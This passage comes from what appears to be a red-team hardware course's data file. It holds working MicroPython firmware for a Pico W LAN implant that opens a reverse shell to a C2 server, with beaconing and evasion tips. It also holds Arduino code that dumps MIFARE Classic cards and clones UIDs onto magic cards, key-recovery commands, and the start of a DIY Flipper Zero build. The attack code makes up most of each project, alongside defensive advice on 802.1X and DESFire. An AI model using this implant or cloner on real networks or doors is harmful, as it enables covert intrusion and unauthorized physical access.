                content: '<p>For the LAN implant, we use MicroPython on the Pico W because it provides better networking libraries and a more complete socket implementation than CircuitPython.</p>' +
                         '<ol>' +
                         '<li>Download MicroPython for the Pico W from <code>micropython.org/download/RPI_PICO_W/</code></li>' +
                         '<li>Hold BOOTSEL, plug in, drag the UF2 file to RPI-RP2.</li>' +
                         '<li>Install Thonny IDE for MicroPython development.</li>' +
                         '</ol>',
                code: '# Verify MicroPython is running\nimport sys\nprint(sys.implementation)\n# MicroPython v1.xx on Raspberry Pi Pico W\n\n# Test WiFi\nimport network\nwlan = network.WLAN(network.STA_IF)\nwlan.active(True)\nprint(wlan.scan())  # List nearby APs',
                language: 'Python',
                tip: '<strong>Tip:</strong> MicroPython on the Pico W supports TCP/UDP sockets, HTTP clients, and basic TLS. For more advanced networking (SSH tunnels, VPN), consider using a Raspberry Pi Zero W instead (runs full Linux).'
            },
            {
                title: 'Write the Implant Firmware',
                content: '<p>The implant connects to a WiFi network for C2 and uses the W5500 for target network access. It establishes a reverse connection to your C2 server and executes commands received over the channel.</p>',
                code: 'import network\nimport socket\nimport time\nimport machine\nfrom machine import Pin, SPI\n\n# ---- Configuration ----\nC2_WIFI_SSID = "YourHotspot"\nC2_WIFI_PASS = "YourPassword"\nC2_SERVER = "10.0.0.1"  # Your C2 server IP\nC2_PORT = 4444\nBEACON_INTERVAL = 30  # seconds between check-ins\n\n# ---- WiFi Connection (C2 Channel) ----\ndef connect_wifi():\n    wlan = network.WLAN(network.STA_IF)\n    wlan.active(True)\n    wlan.connect(C2_WIFI_SSID, C2_WIFI_PASS)\n    timeout = 10\n    while not wlan.isconnected() and timeout > 0:\n        time.sleep(1)\n        timeout -= 1\n    if wlan.isconnected():\n        print(f"WiFi connected: {wlan.ifconfig()[0]}")\n        return True\n    return False\n\n# ---- W5500 Ethernet (Target Network) ----\ndef init_ethernet():\n    spi = SPI(0, baudrate=500000, mosi=Pin(19),\n              miso=Pin(16), sck=Pin(18))\n    cs = Pin(17, Pin.OUT)\n    rst = Pin(20, Pin.OUT)\n    # Initialize W5500 (driver dependent)\n    # Returns the ethernet interface\n    return spi, cs\n\n# ---- Reverse Shell ----\ndef reverse_shell():\n    """Connect back to C2 and accept commands."""\n    try:\n        s = socket.socket()\n        s.connect((C2_SERVER, C2_PORT))\n        s.send(b"[IMPLANT] Connected from target network\\n")\n\n        while True:\n            data = s.recv(1024)\n            if not data:\n                break\n            cmd = data.decode().strip()\n\n            if cmd == "scan":\n                # ARP scan the local network via W5500\n                result = arp_scan()\n                s.send(result.encode())\n            elif cmd == "exfil":\n                # Capture and exfiltrate traffic\n                s.send(b"Starting capture...\\n")\n            elif cmd == "exit":\n                break\n            else:\n                s.send(f"Unknown command: {cmd}\\n".encode())\n\n        s.close()\n    except Exception as e:\n        print(f"C2 connection failed: {e}")\n\ndef arp_scan():\n    """Scan the local network for hosts."""\n    # Simplified - real implementation sends ARP requests\n    # via the W5500 raw socket and collects responses\n    return "ARP scan results:\\n192.168.1.1 - Gateway\\n192.168.1.100 - Host\\n"\n\n# ---- Main Loop ----\nconnect_wifi()\ninit_ethernet()\n\nwhile True:\n    reverse_shell()\n    time.sleep(BEACON_INTERVAL)  # Retry on disconnect',
                language: 'Python',
                tip: '<strong>OPSEC:</strong> In a real engagement, use HTTPS or DNS tunneling for C2 instead of a raw TCP socket. Raw TCP connections on port 4444 are easily detected by firewalls and IDS. DNS tunneling (encoding data in DNS queries) is much harder to detect.'
            },
            {
                title: 'Defense: Detecting LAN Implants',
                content: '<p>LAN implants are small, quiet, and persistent. Here is how to find them:</p>' +
                         '<ul>' +
                         '<li><strong>Network Access Control (802.1X):</strong> Require authentication before granting network access on every switch port. An unauthorized device plugged into a port will not get an IP address.</li>' +
                         '<li><strong>Switch port security:</strong> Limit each port to one MAC address. Enable MAC address sticky learning. Alert on new MAC addresses appearing on existing ports.</li>' +
                         '<li><strong>Physical audits:</strong> Regularly inspect network closets, under desks, and behind equipment for unauthorized devices. A Pico W with an Ethernet adapter is small but visible.</li>' +
                         '<li><strong>Network monitoring:</strong> Monitor for devices that connect to both wired and wireless networks simultaneously (dual-homed). This is a strong indicator of a bridge/implant.</li>' +
                         '<li><strong>Unusual traffic patterns:</strong> An implant generates periodic C2 beacons. Look for regular-interval connections to external IPs, especially over WiFi from a device that also has an Ethernet connection.</li>' +
                         '<li><strong>DHCP monitoring:</strong> Log all DHCP leases. An implant requesting an IP address will appear in the DHCP server logs. Alert on unfamiliar hostnames or MAC OUIs (Raspberry Pi Foundation OUI: B8:27:EB or DC:A6:32).</li>' +
                         '</ul>',
                code: '# Cisco IOS: Enable 802.1X on all access ports\ninterface range GigabitEthernet0/1 - 48\n  switchport mode access\n  dot1x port-control auto\n  switchport port-security maximum 1\n  switchport port-security violation restrict\n  switchport port-security mac-address sticky\n\n# Linux: Detect dual-homed devices (both WiFi and Ethernet)\narp -a | sort -t. -k4 -n\n# Look for the same IP or similar IPs on different interfaces\n\n# Check for Raspberry Pi MAC addresses on your network\narp -a | grep -i "b8:27:eb\\|dc:a6:32\\|28:cd:c1\\|2c:cf:67"\n# These are Raspberry Pi Foundation OUI prefixes',
                language: 'Bash',
                tip: '<strong>802.1X is the definitive defense.</strong> Without port-based authentication, any device can join any network port. With 802.1X, the implant cannot authenticate and gets no network access. This is the single most effective countermeasure against LAN implants.'
            }
        ],

        testing: '<p>Verify your LAN implant works:</p>' +
                 '<ul>' +
                 '<li><strong>WiFi connection:</strong> Power on the implant. It should connect to your test WiFi network within 10 seconds. Check your router\'s client list for the Pico W.</li>' +
                 '<li><strong>C2 connection:</strong> Start a netcat listener (<code>nc -lvnp 4444</code>) on your laptop. The implant should connect and send the greeting message.</li>' +
                 '<li><strong>Ethernet:</strong> Connect the W5500 to your network via Ethernet. Verify it gets a DHCP address. Run the ARP scan command from C2 and verify it returns valid results.</li>' +
                 '<li><strong>Persistence:</strong> Unplug and replug the implant. It should automatically reconnect to WiFi and re-establish the C2 channel without manual intervention.</li>' +
                 '</ul>',

        commonMistakes: [
            {
                title: 'WiFi Not Reaching C2',
                description: 'The Pico W has a small PCB antenna with limited range (~10-15m indoors). If your C2 is far away, use a mobile hotspot positioned closer to the implant, or set up a WiFi relay.'
            },
            {
                title: 'W5500 Not Getting DHCP',
                description: 'Some W5500 modules need a specific SPI clock speed. Try reducing the baud rate to 500kHz or lower. Also verify the RST pin is connected and held HIGH during operation.'
            }
        ]
    },

    // ========================================================================
    // SG-41: RFID/NFC Cloner
    // ========================================================================
    'sg-41': {
        intro: '<p>RFID access cards are everywhere &mdash; office buildings, hotels, parking garages, gym lockers. The vast majority use <strong>unencrypted, easily cloneable</strong> technologies: 125kHz EM4100 (proximity cards) and 13.56MHz MIFARE Classic (NFC cards). These can be read and cloned in seconds with a $15 device.</p>' +
               '<p>Commercial cloners include the <strong>Proxmark3</strong> (~$50-300), the <strong>Flipper Zero</strong> (~$170), and cheap Chinese RFID copiers (~$10). We build our own using an <strong>Arduino</strong> or <strong>ESP32</strong> with an <strong>RC522 NFC module</strong> (13.56MHz) and an optional <strong>RDM6300</strong> (125kHz) for legacy proximity cards.</p>' +
               '<p>This project teaches the fundamentals of RFID/NFC security: how cards store data, why unencrypted cards are insecure, how to read and clone card UIDs, and how organizations should protect their access control systems.</p>' +
               '<p><strong>Hardware needed:</strong> Arduino Nano or ESP32, RC522 NFC module, OLED display (optional), blank MIFARE Classic cards, breadboard, jumper wires. Total cost: ~$15.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 300" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs><pattern id="bg-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern></defs>' +
            '<rect width="720" height="300" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="280" fill="url(#bg-grid)" rx="4"/>' +
            '<text x="360" y="35" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">RFID/NFC CLONER &mdash; WIRING DIAGRAM</text>' +
            '<!-- Arduino -->' +
            '<g class="svg-component">' +
            '<rect x="80" y="55" width="200" height="110" rx="8" fill="#1e2736" stroke="#dc2626" stroke-width="1.5"/>' +
            '<rect x="80" y="55" width="200" height="24" rx="8" fill="rgba(220,38,38,0.12)"/>' +
            '<text x="180" y="72" text-anchor="middle" fill="#ef4444" font-size="11" font-weight="600">Arduino Nano / ESP32</text>' +
            '<text x="100" y="95" fill="#8b949e" font-size="8">D13 (SCK)  &rarr; RC522 SCK</text>' +
            '<text x="100" y="110" fill="#8b949e" font-size="8">D11 (MOSI) &rarr; RC522 MOSI</text>' +
            '<text x="100" y="125" fill="#8b949e" font-size="8">D12 (MISO) &rarr; RC522 MISO</text>' +
            '<text x="100" y="140" fill="#8b949e" font-size="8">D10 (SS)   &rarr; RC522 SDA</text>' +
            '<text x="100" y="155" fill="#8b949e" font-size="8">D9         &rarr; RC522 RST</text>' +
            '</g>' +
            '<!-- RC522 -->' +
            '<g class="svg-component">' +
            '<rect x="400" y="55" width="200" height="110" rx="8" fill="#1e2736" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<rect x="400" y="55" width="200" height="24" rx="8" fill="rgba(59,130,246,0.12)"/>' +
            '<text x="500" y="72" text-anchor="middle" fill="#60a5fa" font-size="11" font-weight="600">RC522 NFC Module</text>' +
            '<text x="500" y="95" text-anchor="middle" fill="#8b949e" font-size="8">13.56 MHz (ISO 14443A)</text>' +
            '<text x="500" y="110" text-anchor="middle" fill="#8b949e" font-size="8">Reads: MIFARE Classic 1K/4K</text>' +
            '<text x="500" y="125" text-anchor="middle" fill="#8b949e" font-size="8">Read range: 3-5 cm</text>' +
            '<text x="500" y="140" text-anchor="middle" fill="#8b949e" font-size="8">SPI interface</text>' +
            '<text x="500" y="155" text-anchor="middle" fill="#555" font-size="7">Also reads NTAG213/215/216</text>' +
            '</g>' +
            '<!-- Wires -->' +
            '<line x1="280" y1="95" x2="398" y2="95" stroke="#eab308" stroke-width="1.5" stroke-dasharray="4,3"/>' +
            '<line x1="280" y1="110" x2="398" y2="110" stroke="#22c55e" stroke-width="1.5" stroke-dasharray="4,3"/>' +
            '<line x1="280" y1="125" x2="398" y2="125" stroke="#3b82f6" stroke-width="1.5" stroke-dasharray="4,3"/>' +
            '<line x1="280" y1="140" x2="398" y2="140" stroke="#f97316" stroke-width="1.5" stroke-dasharray="4,3"/>' +
            '<!-- Card types -->' +
            '<text x="360" y="200" text-anchor="middle" fill="#555" font-size="9" letter-spacing="0.1em">COMMON CARD TECHNOLOGIES</text>' +
            '<rect x="60" y="215" width="145" height="45" rx="5" fill="rgba(220,38,38,0.08)" stroke="rgba(220,38,38,0.3)" stroke-width="0.5"/>' +
            '<text x="133" y="233" text-anchor="middle" fill="#ef4444" font-size="8" font-weight="600">EM4100 (125kHz)</text>' +
            '<text x="133" y="248" text-anchor="middle" fill="#555" font-size="6">No encryption. Cloneable.</text>' +
            '<rect x="220" y="215" width="145" height="45" rx="5" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.3)" stroke-width="0.5"/>' +
            '<text x="293" y="233" text-anchor="middle" fill="#eab308" font-size="8" font-weight="600">MIFARE Classic</text>' +
            '<text x="293" y="248" text-anchor="middle" fill="#555" font-size="6">Broken crypto. Cloneable.</text>' +
            '<rect x="380" y="215" width="145" height="45" rx="5" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.3)" stroke-width="0.5"/>' +
            '<text x="453" y="233" text-anchor="middle" fill="#22c55e" font-size="8" font-weight="600">MIFARE DESFire</text>' +
            '<text x="453" y="248" text-anchor="middle" fill="#22c55e" font-size="6">AES encryption. Secure.</text>' +
            '<rect x="540" y="215" width="140" height="45" rx="5" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.3)" stroke-width="0.5"/>' +
            '<text x="610" y="233" text-anchor="middle" fill="#22c55e" font-size="8" font-weight="600">iCLASS SE / SEOS</text>' +
            '<text x="610" y="248" text-anchor="middle" fill="#22c55e" font-size="6">PKI-based. Very secure.</text>' +
            '</svg>' +
            '</div>',

        wiring: '    WIRING DIAGRAM\n' +
                '\n' +
                '    Arduino Nano         RC522 NFC Module\n' +
                '    +------------------+  +------------------+\n' +
                '    |  D13 (SCK)     --|--|-- SCK             |\n' +
                '    |  D11 (MOSI)    --|--|-- MOSI            |\n' +
                '    |  D12 (MISO)    --|--|-- MISO            |\n' +
                '    |  D10 (SS)      --|--|-- SDA             |\n' +
                '    |  D9            --|--|-- RST             |\n' +
                '    |  3.3V          --|--|-- 3.3V            |\n' +
                '    |  GND           --|--|-- GND             |\n' +
                '    +------------------+  +------------------+\n' +
                '\n' +
                '    IMPORTANT: RC522 is 3.3V ONLY.\n' +
                '    Do NOT connect to 5V or you will damage it.\n' +
                '    Arduino Nano has a 3.3V output pin - use it.',

        wiringNotes: '<p><strong>3.3V only:</strong> The RC522 module runs on 3.3V. Connecting it to 5V will damage it. Arduino Nano has a 3.3V regulator output pin &mdash; use that. If using an ESP32, all GPIO is already 3.3V.</p>' +
                     '<p><strong>Read range:</strong> The RC522 antenna reads cards at 3-5cm. This is enough for contact-based reading (touching the card to the reader) but not for walk-by attacks. For longer range, you need a larger antenna or a Proxmark3 with a custom coil.</p>',

        steps: [
            {
                title: 'Install the MFRC522 Library and Read a Card',
                content: '<p>The MFRC522 Arduino library handles all communication with the RC522 module. Install it and run a basic card read to verify your wiring.</p>',
                code: '// Arduino: Install "MFRC522" library via Library Manager\n// File > New, paste this code, upload:\n\n#include <SPI.h>\n#include <MFRC522.h>\n\n#define SS_PIN 10\n#define RST_PIN 9\n\nMFRC522 mfrc522(SS_PIN, RST_PIN);\n\nvoid setup() {\n    Serial.begin(9600);\n    SPI.begin();\n    mfrc522.PCD_Init();\n    Serial.println("RFID/NFC Reader Ready");\n    Serial.println("Hold a card near the reader...");\n}\n\nvoid loop() {\n    // Wait for a card\n    if (!mfrc522.PICC_IsNewCardPresent()) return;\n    if (!mfrc522.PICC_ReadCardSerial()) return;\n\n    // Print card UID\n    Serial.print("Card UID: ");\n    for (byte i = 0; i < mfrc522.uid.size; i++) {\n        if (mfrc522.uid.uidByte[i] < 0x10) Serial.print("0");\n        Serial.print(mfrc522.uid.uidByte[i], HEX);\n        if (i < mfrc522.uid.size - 1) Serial.print(":");\n    }\n    Serial.println();\n\n    // Print card type\n    MFRC522::PICC_Type type = mfrc522.PICC_GetType(mfrc522.uid.sak);\n    Serial.print("Card type: ");\n    Serial.println(mfrc522.PICC_GetTypeName(type));\n\n    mfrc522.PICC_HaltA();\n    delay(1000);\n}',
                language: 'C++',
                tip: '<strong>Tip:</strong> The card UID is the unique identifier. Most basic access control systems check only the UID. If you clone the UID to another card, the door opens. This is why UID-only authentication is fundamentally insecure.'
            },
            {
                title: 'Read MIFARE Classic Sectors',
                content: '<p>MIFARE Classic 1K cards have 16 sectors, each with 4 blocks of 16 bytes. Each sector is protected by two keys (Key A and Key B). The default keys are <code>FF FF FF FF FF FF</code> &mdash; and many systems never change them.</p>',
                code: '#include <SPI.h>\n#include <MFRC522.h>\n\nMFRC522 mfrc522(10, 9);\nMFRC522::MIFARE_Key key;\n\nvoid setup() {\n    Serial.begin(9600);\n    SPI.begin();\n    mfrc522.PCD_Init();\n\n    // Default key: FF FF FF FF FF FF\n    for (byte i = 0; i < 6; i++) key.keyByte[i] = 0xFF;\n\n    Serial.println("MIFARE Classic Sector Dump");\n    Serial.println("Hold card to reader...");\n}\n\nvoid loop() {\n    if (!mfrc522.PICC_IsNewCardPresent()) return;\n    if (!mfrc522.PICC_ReadCardSerial()) return;\n\n    Serial.println("\\n=== FULL CARD DUMP ===");\n\n    // Read all 16 sectors\n    for (byte sector = 0; sector < 16; sector++) {\n        byte block = sector * 4;  // First block of sector\n\n        // Authenticate with Key A\n        MFRC522::StatusCode status = mfrc522.PCD_Authenticate(\n            MFRC522::PICC_CMD_MF_AUTH_KEY_A, block, &key, &(mfrc522.uid)\n        );\n\n        if (status != MFRC522::STATUS_OK) {\n            Serial.printf("Sector %d: Auth FAILED (non-default key)\\n", sector);\n            continue;\n        }\n\n        // Read 4 blocks in this sector\n        for (byte b = 0; b < 4; b++) {\n            byte buffer[18];\n            byte size = sizeof(buffer);\n            status = mfrc522.MIFARE_Read(block + b, buffer, &size);\n\n            if (status == MFRC522::STATUS_OK) {\n                Serial.printf("Block %02d: ", block + b);\n                for (byte i = 0; i < 16; i++) {\n                    if (buffer[i] < 0x10) Serial.print("0");\n                    Serial.print(buffer[i], HEX);\n                    Serial.print(" ");\n                }\n                Serial.println();\n            }\n        }\n    }\n\n    mfrc522.PICC_HaltA();\n    mfrc522.PCD_StopCrypto1();\n    delay(2000);\n}',
                language: 'C++',
                tip: '<strong>Key recovery:</strong> If the default keys do not work, the MIFARE Classic Crypto-1 encryption is broken. Tools like <code>mfoc</code> and <code>mfcuk</code> (on a Proxmark3 or using libnfc) can recover all sector keys in minutes using known vulnerabilities in the Crypto-1 algorithm.'
            },
            {
                title: 'Clone a Card UID',
                content: '<p>To clone a card, you need a "magic" MIFARE card (also called a UID-writable card, Gen1a, or "Chinese magic card"). Normal MIFARE cards have their UID burned in at the factory and cannot be changed. Magic cards allow writing to Block 0, which contains the UID.</p>',
                code: '// Clone UID from source card to a magic MIFARE card\n// You need: source card UID (from Step 1) + blank magic card\n\n#include <SPI.h>\n#include <MFRC522.h>\n\nMFRC522 mfrc522(10, 9);\n\n// UID to clone (replace with the UID you read in Step 1)\nbyte targetUID[] = {0xDE, 0xAD, 0xBE, 0xEF};\nbyte targetUIDSize = 4;\n\nvoid setup() {\n    Serial.begin(9600);\n    SPI.begin();\n    mfrc522.PCD_Init();\n    Serial.println("UID Cloner Ready");\n    Serial.println("Hold a MAGIC/UID-WRITABLE card to the reader...");\n}\n\nvoid loop() {\n    if (!mfrc522.PICC_IsNewCardPresent()) return;\n    if (!mfrc522.PICC_ReadCardSerial()) return;\n\n    Serial.print("Current card UID: ");\n    for (byte i = 0; i < mfrc522.uid.size; i++) {\n        Serial.printf("%02X ", mfrc522.uid.uidByte[i]);\n    }\n    Serial.println();\n\n    // Write new UID to Block 0 (magic card only)\n    // Block 0 format: UID (4 bytes) + BCC + SAK + ATQA + manufacturer data\n    byte block0[16] = {0};\n    block0[0] = targetUID[0];\n    block0[1] = targetUID[1];\n    block0[2] = targetUID[2];\n    block0[3] = targetUID[3];\n    block0[4] = targetUID[0] ^ targetUID[1] ^ targetUID[2] ^ targetUID[3]; // BCC\n    block0[5] = 0x08;  // SAK (MIFARE Classic 1K)\n    block0[6] = 0x04;  // ATQA byte 1\n    block0[7] = 0x00;  // ATQA byte 2\n\n    // Authenticate and write Block 0\n    MFRC522::MIFARE_Key key;\n    for (byte i = 0; i < 6; i++) key.keyByte[i] = 0xFF;\n\n    MFRC522::StatusCode status;\n    status = mfrc522.PCD_Authenticate(\n        MFRC522::PICC_CMD_MF_AUTH_KEY_A, 0, &key, &(mfrc522.uid)\n    );\n\n    if (status == MFRC522::STATUS_OK) {\n        status = mfrc522.MIFARE_Write(0, block0, 16);\n        if (status == MFRC522::STATUS_OK) {\n            Serial.println("*** UID CLONED SUCCESSFULLY ***");\n            Serial.printf("New UID: %02X:%02X:%02X:%02X\\n",\n                targetUID[0], targetUID[1], targetUID[2], targetUID[3]);\n        } else {\n            Serial.println("Write failed. Is this a magic card?");\n        }\n    } else {\n        Serial.println("Authentication failed.");\n    }\n\n    mfrc522.PICC_HaltA();\n    mfrc522.PCD_StopCrypto1();\n    while (true) delay(1000);  // Stop after clone\n}',
                language: 'C++',
                tip: '<strong>Where to buy magic cards:</strong> Search for "UID writable MIFARE" or "magic MIFARE card" on AliExpress or Amazon. They come in card, keychain fob, and sticker form factors. A pack of 10 costs ~$5.'
            },
            {
                title: 'Defense: Securing RFID Access Control',
                content: '<p>If your building uses UID-only authentication or MIFARE Classic, your access control is broken. Here is how to fix it:</p>' +
                         '<ul>' +
                         '<li><strong>Upgrade to MIFARE DESFire EV2/EV3:</strong> DESFire uses AES-128 encryption. The card and reader perform a mutual authentication handshake &mdash; cloning the UID alone does not work because the cloned card cannot complete the crypto challenge.</li>' +
                         '<li><strong>Never use UID-only auth:</strong> If your access control system only checks the card UID and does not verify the card\'s cryptographic credentials, it is trivially defeated. This is the RFID equivalent of checking someone\'s name badge but not their ID.</li>' +
                         '<li><strong>iCLASS SE / SEOS:</strong> HID\'s modern platform uses PKI (public key infrastructure) with certificates on each card. This is the gold standard for physical access control.</li>' +
                         '<li><strong>Multi-factor:</strong> Combine card + PIN, or card + biometric. Even if a card is cloned, the attacker does not have the PIN or fingerprint.</li>' +
                         '<li><strong>Audit logs:</strong> Monitor for anomalies: same card used at two doors simultaneously, card used at unusual hours, multiple failed reads followed by a successful read (indicating cloning attempts).</li>' +
                         '<li><strong>Anti-tailgating:</strong> Mantraps, turnstiles, and security cameras prevent someone from simply following an authorized person through a door, bypassing card auth entirely.</li>' +
                         '</ul>',
                code: '# Test your access cards (on systems you own):\n# Install libnfc on Linux:\nsudo apt install libnfc-bin libnfc-examples\n\n# Read a card:\nnfc-list\n# Shows card type and UID\n\n# Full MIFARE Classic dump:\nnfc-mfclassic r a output.mfd\n# Dumps all sectors to a file\n\n# Check if default keys work (vulnerability test):\nnfc-mfclassic r A output.mfd f keys.mfd\n# If it reads successfully with default keys,\n# your access control is vulnerable.\n\n# Proxmark3 (if you have one):\n# pm3 --> hf mf autopwn\n# Automatically recovers all keys and dumps the card',
                language: 'Bash',
                tip: '<strong>Bottom line:</strong> If you can clone a card with a $15 Arduino and an RC522 module, the access control system is not providing real security. Lobby the building manager to upgrade to DESFire or better.'
            }
        ],

        testing: '<p>Verify your RFID cloner works:</p>' +
                 '<ul>' +
                 '<li><strong>Read test:</strong> Hold any NFC card (credit card, transit pass, ID badge) to the RC522. The serial monitor should display the UID and card type. If nothing happens, check SPI wiring.</li>' +
                 '<li><strong>Sector dump:</strong> Read a MIFARE Classic card. You should see the data from all 16 sectors (or "Auth FAILED" for sectors with non-default keys).</li>' +
                 '<li><strong>Clone test:</strong> Read a source card\'s UID, then write it to a magic card. Read the magic card back and verify the UID matches the source.</li>' +
                 '<li><strong>Access test:</strong> If you own a simple RFID door lock (available for ~$15 on Amazon), test the cloned card against it. The cloned card should open the lock just like the original.</li>' +
                 '</ul>',

        commonMistakes: [
            {
                title: '5V Connected to RC522',
                description: 'The RC522 is a 3.3V device. Connecting it to 5V will damage or destroy the module. Always use the 3.3V output from your Arduino/ESP32.'
            },
            {
                title: 'Using a Normal Card for Cloning',
                description: 'Normal MIFARE cards have Block 0 locked at the factory. You need a "magic" or "UID-writable" card to change the UID. If Block 0 write fails, your card is not a magic card.'
            }
        ]
    },

    // ========================================================================
    // SG-42: Flipper Zero DIY Alternative
    // ========================================================================
    'sg-42': {
        intro: '<p>The <strong>Flipper Zero</strong> ($170) is the Swiss army knife of hardware hacking: it combines Sub-GHz RF transceiver, NFC/RFID reader, infrared blaster, iButton reader, USB HID injection, Bluetooth, WiFi (with add-on), and GPIO &mdash; all in a pocket-sized device with a screen and a playful dolphin mascot.</p>' +
               '<p>We build a DIY alternative that replicates the Flipper\'s core capabilities using an <strong>ESP32-S3</strong> as the brain, with modules for each radio technology: <strong>CC1101</strong> (Sub-GHz RF), <strong>RC522</strong> (NFC), <strong>IR LED/receiver</strong>, and a <strong>TFT display</strong> with navigation buttons. Total cost: ~$25 vs $170.</p>' +
               '<p>This is the capstone project of the Red Team Hardware section. It combines everything you learned in SG-33 through SG-41 into a single multi-tool device. It will not have the Flipper\'s polished firmware or cute dolphin, but it will have the same capabilities and will teach you far more about how each radio technology actually works.</p>' +
               '<p><strong>Hardware needed:</strong> ESP32-S3 DevKit, CC1101 Sub-GHz module, RC522 NFC module, IR LED + IR receiver (TSOP38238), 1.8" TFT (ST7735), 5 buttons, MicroSD breakout, breadboard, jumper wires. Total cost: ~$25.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 380" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs><pattern id="bg-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern></defs>' +
            '<rect width="720" height="380" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="360" fill="url(#bg-grid)" rx="4"/>' +
            '<text x="360" y="30" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">FLIPPER ZERO DIY &mdash; MULTI-TOOL ARCHITECTURE</text>' +
            '<!-- ESP32-S3 center -->' +
            '<rect x="250" y="45" width="220" height="80" rx="8" fill="#1e2736" stroke="#dc2626" stroke-width="1.5"/>' +
            '<rect x="250" y="45" width="220" height="22" rx="8" fill="rgba(220,38,38,0.12)"/>' +
            '<text x="360" y="61" text-anchor="middle" fill="#ef4444" font-size="10" font-weight="600">ESP32-S3 (Brain)</text>' +
            '<text x="360" y="80" text-anchor="middle" fill="#8b949e" font-size="7">Dual-core 240MHz, WiFi, BT, USB-OTG</text>' +
            '<text x="360" y="93" text-anchor="middle" fill="#8b949e" font-size="7">Coordinates all modules via SPI/I2C/GPIO</text>' +
            '<text x="360" y="106" text-anchor="middle" fill="#8b949e" font-size="7">Menu system on TFT display</text>' +
            '<!-- Modules arranged around ESP32 -->' +
            '<!-- CC1101 -->' +
            '<rect x="30" y="150" width="140" height="65" rx="6" fill="rgba(168,85,247,0.08)" stroke="rgba(168,85,247,0.3)" stroke-width="1"/>' +
            '<text x="100" y="170" text-anchor="middle" fill="#a855f7" font-size="9" font-weight="600">CC1101 Sub-GHz</text>' +
            '<text x="100" y="185" text-anchor="middle" fill="#8b949e" font-size="7">300-928 MHz RF</text>' +
            '<text x="100" y="200" text-anchor="middle" fill="#555" font-size="6">Garage, car key, remote</text>' +
            '<line x1="170" y1="180" x2="250" y2="100" stroke="#a855f7" stroke-width="1" stroke-dasharray="4,3"/>' +
            '<!-- RC522 -->' +
            '<rect x="190" y="150" width="140" height="65" rx="6" fill="rgba(59,130,246,0.08)" stroke="rgba(59,130,246,0.3)" stroke-width="1"/>' +
            '<text x="260" y="170" text-anchor="middle" fill="#3b82f6" font-size="9" font-weight="600">RC522 NFC</text>' +
            '<text x="260" y="185" text-anchor="middle" fill="#8b949e" font-size="7">13.56 MHz RFID/NFC</text>' +
            '<text x="260" y="200" text-anchor="middle" fill="#555" font-size="6">Access cards, badges</text>' +
            '<line x1="260" y1="150" x2="310" y2="125" stroke="#3b82f6" stroke-width="1" stroke-dasharray="4,3"/>' +
            '<!-- IR -->' +
            '<rect x="350" y="150" width="140" height="65" rx="6" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.3)" stroke-width="1"/>' +
            '<text x="420" y="170" text-anchor="middle" fill="#eab308" font-size="9" font-weight="600">IR TX/RX</text>' +
            '<text x="420" y="185" text-anchor="middle" fill="#8b949e" font-size="7">Infrared 38kHz</text>' +
            '<text x="420" y="200" text-anchor="middle" fill="#555" font-size="6">TV, AC, projector remote</text>' +
            '<line x1="420" y1="150" x2="400" y2="125" stroke="#eab308" stroke-width="1" stroke-dasharray="4,3"/>' +
            '<!-- USB HID -->' +
            '<rect x="510" y="150" width="140" height="65" rx="6" fill="rgba(220,38,38,0.08)" stroke="rgba(220,38,38,0.3)" stroke-width="1"/>' +
            '<text x="580" y="170" text-anchor="middle" fill="#ef4444" font-size="9" font-weight="600">USB HID</text>' +
            '<text x="580" y="185" text-anchor="middle" fill="#8b949e" font-size="7">Native USB-OTG</text>' +
            '<text x="580" y="200" text-anchor="middle" fill="#555" font-size="6">Rubber Ducky payloads</text>' +
            '<line x1="510" y1="175" x2="470" y2="110" stroke="#ef4444" stroke-width="1" stroke-dasharray="4,3"/>' +
            '<!-- Display -->' +
            '<rect x="30" y="240" width="140" height="55" rx="6" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.3)" stroke-width="1"/>' +
            '<text x="100" y="260" text-anchor="middle" fill="#22c55e" font-size="9" font-weight="600">TFT Display</text>' +
            '<text x="100" y="275" text-anchor="middle" fill="#8b949e" font-size="7">1.8" ST7735 SPI</text>' +
            '<text x="100" y="288" text-anchor="middle" fill="#555" font-size="6">Menu + status</text>' +
            '<!-- SD -->' +
            '<rect x="190" y="240" width="120" height="55" rx="6" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.2)" stroke-width="0.5"/>' +
            '<text x="250" y="260" text-anchor="middle" fill="#eab308" font-size="9" font-weight="600">MicroSD</text>' +
            '<text x="250" y="275" text-anchor="middle" fill="#8b949e" font-size="7">Signal storage</text>' +
            '<!-- Buttons -->' +
            '<rect x="330" y="240" width="130" height="55" rx="6" fill="rgba(255,255,255,0.03)" stroke="rgba(255,255,255,0.1)" stroke-width="0.5"/>' +
            '<text x="395" y="260" text-anchor="middle" fill="#8b949e" font-size="9" font-weight="600">5 Buttons</text>' +
            '<text x="395" y="275" text-anchor="middle" fill="#555" font-size="7">U/D/L/R/OK</text>' +
            '<!-- Battery -->' +
            '<rect x="480" y="240" width="130" height="55" rx="6" fill="rgba(59,130,246,0.08)" stroke="rgba(59,130,246,0.2)" stroke-width="0.5"/>' +
            '<text x="545" y="260" text-anchor="middle" fill="#3b82f6" font-size="9" font-weight="600">LiPo Battery</text>' +
            '<text x="545" y="275" text-anchor="middle" fill="#8b949e" font-size="7">Optional, 3.7V 1200mAh</text>' +
            '<!-- Capabilities summary -->' +
